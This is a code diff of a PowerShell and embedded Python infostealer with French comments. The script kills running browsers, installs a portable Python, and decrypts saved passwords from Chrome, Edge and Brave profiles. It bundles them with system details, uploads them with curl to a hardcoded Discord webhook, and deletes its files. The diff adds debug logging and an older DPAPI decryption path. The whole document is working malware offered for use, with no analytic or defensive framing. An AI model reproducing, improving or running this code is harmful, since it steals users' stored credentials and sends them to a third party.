@@ -1,15 +1,23 @@
 $wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
 
-# KILL ULTRA-AGRESSIF
+# Kill ULTRA-AGRESSIF avec vérification
 Write-Host "Killing browsers..." -ForegroundColor Yellow
-Stop-Process -Name brave* -Force -EA 0
-Stop-Process -Name msedge* -Force -EA 0
-Stop-Process -Name chrome* -Force -EA 0
-Get-Process | Where {$_.ProcessName -like "*brave*"} | Stop-Process -Force -EA 0
+$braveProcs = Get-Process brave* -EA 0
+if ($braveProcs) {
+    Write-Host "Found Brave processes: $($braveProcs.Count)" -ForegroundColor Red
+    Stop-Process -Name brave* -Force -EA 0
+    Start-Sleep -Seconds 2
+}
+Stop-Process -Name msedge*,chrome*,firefox* -Force -EA 0
 Start-Sleep -Seconds 5
 
+# Vérifier que Brave est bien arrêté
+$stillRunning = Get-Process brave* -EA 0
+if ($stillRunning) {
+    Write-Host "WARNING: Brave still running!" -ForegroundColor Red
+}
+
 try{
-# Python setup (identique)
 $pyPath="$env:TEMP\py"
 $needInstall=$false
 
@@ -22,7 +30,6 @@ if(!(Test-Path "$pyPath\python.exe")){
 }
 
 if($needInstall){
- Write-Host "Installing Python..." -ForegroundColor Yellow
  Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
  Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
  (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
@@ -36,7 +43,7 @@ if($needInstall){
 cd $pyPath
 
 @'
-import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
+import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,sys
 from Crypto.Cipher import AES
 
 try:
@@ -54,39 +61,78 @@ import locale
 language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 
 def d(db,st,n):
+ debug_log=[]
  try:
+  debug_log.append(f"\n[{n}] Starting extraction...")
+  
+  # Vérifier existence des fichiers
   if not os.path.exists(db):
-   return []
+   debug_log.append(f"[{n}] ERROR: Login Data not found at {db}")
+   return [],debug_log
+  debug_log.append(f"[{n}] ✓ Login Data exists ({os.path.getsize(db)} bytes)")
+  
   if not os.path.exists(st):
-   return []
+   debug_log.append(f"[{n}] ERROR: Local State not found at {st}")
+   return [],debug_log
+  debug_log.append(f"[{n}] ✓ Local State exists ({os.path.getsize(st)} bytes)")
   
-  with open(st,'r',encoding='utf-8') as f:
-   local_state=json.load(f)
+  # Lire la clé
+  try:
+   with open(st,'r',encoding='utf-8') as f:
+    local_state=json.load(f)
+   encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+   encrypted_key=encrypted_key[5:]
+   k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
+   debug_log.append(f"[{n}] ✓ Encryption key extracted ({len(k)} bytes)")
+  except Exception as e:
+   debug_log.append(f"[{n}] ERROR extracting key: {e}")
+   return [],debug_log
   
-  encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-  encrypted_key=encrypted_key[5:]
-  k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
-  
-  temp_db=f"temp_{n}_{os.getpid()}_{time.time()}.db"
-  
-  # Attendre que le fichier soit accessible
-  for attempt in range(10):
+  # Copier le fichier
+  temp_db=f"temp_{n}_{os.getpid()}.db"
+  copied=False
+  for attempt in range(15):
    try:
     if os.path.exists(temp_db):
      os.remove(temp_db)
     shutil.copy2(db,temp_db)
+    copied=True
+    debug_log.append(f"[{n}] ✓ Database copied (attempt {attempt+1})")
     break
    except Exception as e:
-    if attempt < 9:
+    if attempt < 14:
      time.sleep(1)
     else:
-     return []
+     debug_log.append(f"[{n}] ERROR copying database: {e}")
+     return [],debug_log
   
+  if not copied:
+   return [],debug_log
+  
+  # Lire la base de données
   r=[]
   try:
-   c=sqlite3.connect(temp_db,timeout=30)
+   c=sqlite3.connect(temp_db,timeout=60)
    cursor=c.cursor()
+   
+   # Compter les entrées
+   cursor.execute("SELECT COUNT(*) FROM logins")
+   total_count=cursor.fetchone()[0]
+   debug_log.append(f"[{n}] Total logins in DB: {total_count}")
+   
+   cursor.execute("SELECT COUNT(*) FROM logins WHERE username_value!=''")
+   with_username=cursor.fetchone()[0]
+   debug_log.append(f"[{n}] Logins with username: {with_username}")
+   
+   cursor.execute("SELECT COUNT(*) FROM logins WHERE username_value!='' AND password_value!=''")
+   with_password=cursor.fetchone()[0]
+   debug_log.append(f"[{n}] Logins with password: {with_password}")
+   
+   # Extraire
    cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!='' AND password_value!=''")
+   
+   decrypted_count=0
+   failed_count=0
    
    for row in cursor.fetchall():
     try:
@@ -94,7 +140,13 @@ def d(db,st,n):
      user=row[1]
      enc_pwd=row[2]
      
-     if enc_pwd and len(enc_pwd)>15:
+     if not enc_pwd or len(enc_pwd)<15:
+      failed_count+=1
+      continue
+     
+     # Vérifier le format
+     if enc_pwd[0:3] == b'v10':
+      # AES-GCM
       nonce=enc_pwd[3:15]
       ciphertext=enc_pwd[15:-16]
       tag=enc_pwd[-16:]
@@ -103,12 +155,23 @@ def d(db,st,n):
       pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
       
       r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
+      decrypted_count+=1
+     else:
+      # DPAPI ancien format
+      try:
+       decrypted=win32crypt.CryptUnprotectData(enc_pwd,None,None,None,0)[1]
+       pwd=decrypted.decode('utf-8','ignore')
+       r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
+       decrypted_count+=1
+      except:
+       failed_count+=1
     except Exception as e:
-     pass
+     failed_count+=1
    
+   debug_log.append(f"[{n}] Decrypted: {decrypted_count} / Failed: {failed_count}")
    c.close()
   except Exception as e:
-   pass
+   debug_log.append(f"[{n}] ERROR reading database: {e}")
   finally:
    try:
     if os.path.exists(temp_db):
@@ -117,39 +180,29 @@ def d(db,st,n):
    except:
     pass
   
-  return r
+  return r,debug_log
   
  except Exception as e:
-  return []
+  debug_log.append(f"[{n}] FATAL ERROR: {e}")
+  return [],debug_log
 
-# SCAN COMPLET DU SYSTÈME
-def scan_all_drives():
- """Scanner tous les disques pour trouver les navigateurs"""
+# Scanner
+def scan_all_browsers():
  results=[]
+ all_debug=[]
  browsers_found=[]
  
- # Disques à scanner
- import string
- drives=[f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
- 
- # Chemins standards
  user_paths=[
   os.path.expandvars(r"%LOCALAPPDATA%"),
-  os.path.expandvars(r"%APPDATA%"),
-  os.path.expandvars(r"%USERPROFILE%")
+  os.path.expandvars(r"%APPDATA%")
  ]
  
- # Patterns de recherche
  patterns=[
   ("Edge",r"Microsoft\Edge\User Data"),
   ("Brave",r"BraveSoftware\Brave-Browser\User Data"),
-  ("Brave-Nightly",r"BraveSoftware\Brave-Browser-Nightly\User Data"),
-  ("Brave-Beta",r"BraveSoftware\Brave-Browser-Beta\User Data"),
-  ("Chrome",r"Google\Chrome\User Data"),
-  ("Chromium",r"Chromium\User Data")
+  ("Chrome",r"Google\Chrome\User Data")
  ]
  
- # Scanner les chemins utilisateur
  for base_path in user_paths:
   for browser_name,pattern in patterns:
    full_path=os.path.join(base_path,pattern)
@@ -161,42 +214,29 @@ def scan_all_drives():
      # Default profile
      default_login=os.path.join(full_path,"Default","Login Data")
      if os.path.exists(default_login):
-      pwd_list=d(default_login,local_state,f"{browser_name}-Default")
+      pwd_list,debug=d(default_login,local_state,f"{browser_name}-Default")
       results.extend(pwd_list)
+      all_debug.extend(debug)
      
-     # Tous les profils
-     for item in os.listdir(full_path):
-      item_path=os.path.join(full_path,item)
-      if os.path.isdir(item_path) and (item.startswith("Profile") or item.startswith("Person")):
-       profile_login=os.path.join(item_path,"Login Data")
-       if os.path.exists(profile_login):
-        pwd_list=d(profile_login,local_state,f"{browser_name}-{item}")
-        results.extend(pwd_list)
- 
- # Scanner Program Files
- for drive in drives[:1]:  # Scanner seulement C:\ pour éviter la lenteur
-  for pf in ["Program Files","Program Files (x86)"]:
-   pf_path=os.path.join(drive,pf)
-   if os.path.exists(pf_path):
-    for browser_name,pattern in patterns:
-     search_path=os.path.join(pf_path,pattern.split("\\")[0])
-     if os.path.exists(search_path):
-      # Chercher récursivement "User Data"
-      for root,dirs,files in os.walk(search_path):
-       if "User Data" in root and "Local State" in files:
-        browsers_found.append(f"{browser_name}: {root}")
-        local_state=os.path.join(root,"Local State")
-        default_login=os.path.join(root,"Default","Login Data")
-        if os.path.exists(default_login):
-         pwd_list=d(default_login,local_state,f"{browser_name}-Default")
+     # Autres profils
+     try:
+      for item in os.listdir(full_path):
+       item_path=os.path.join(full_path,item)
+       if os.path.isdir(item_path) and (item.startswith("Profile") or item.startswith("Person")):
+        profile_login=os.path.join(item_path,"Login Data")
+        if os.path.exists(profile_login):
+         pwd_list,debug=d(profile_login,local_state,f"{browser_name}-{item}")
          results.extend(pwd_list)
+         all_debug.extend(debug)
+     except:
+      pass
  
- return results,browsers_found
+ return results,browsers_found,all_debug
 
-# EXÉCUTER LE SCAN
-res,browsers_found=scan_all_drives()
+# EXÉCUTER
+res,browsers_found,debug_logs=scan_all_browsers()
 
-# Compter par navigateur
+# Compter
 browser_counts={}
 for item in res:
  browser=item.split("]")[0].strip("[")
@@ -204,7 +244,6 @@ for item in res:
 
 browser_info="\n".join([f"{k}: {v} passwords" for k,v in browser_counts.items()]) if browser_counts else "No passwords found"
 
-# Informations système
 info=f"""{'='*60}
 SYSTEM INFORMATION
 {'='*60}
@@ -232,6 +271,10 @@ BROWSER PATHS FOUND:
 {chr(10).join(browsers_found) if browsers_found else "No browser paths found"}
 {'='*60}
 
+DEBUG LOG:
+{chr(10).join(debug_logs)}
+{'='*60}
+
 """
 
 with open("p.txt","w",encoding="utf-8") as f:
@@ -244,11 +287,9 @@ with open("p.txt","w",encoding="utf-8") as f:
 print("OK")
 '@|Out-File "e.py" -Encoding UTF8
 
-Write-Host "Running password extraction..." -ForegroundColor Yellow
 $r=.\python.exe e.py 2>$null
 
 if($r -eq "OK"){
- Write-Host "Uploading results..." -ForegroundColor Green
  curl.exe -F "file=@p.txt" $wh 2>$null
  Remove-Item p.txt,e.py -Force -EA 0
 }
